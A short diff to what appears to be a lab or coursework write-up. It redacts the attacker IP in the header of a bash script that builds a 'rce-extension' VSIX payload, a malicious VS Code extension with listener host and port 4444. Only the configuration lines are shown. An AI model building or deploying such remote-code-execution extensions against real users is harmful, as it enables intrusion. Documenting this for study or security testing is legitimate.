@@ -110,7 +110,7 @@ To accomplish this, I referenced and customized a VSIX Payload creation script f
 #!/usr/bin/env bash
 set -e
 
-LHOST="${1:-10.10.15.31}"
+LHOST="${1:-10.10.X.X}"
 LPORT="${2:-4444}"
 NAME="rce-extension"
 PUBLISHER="ecm3401"
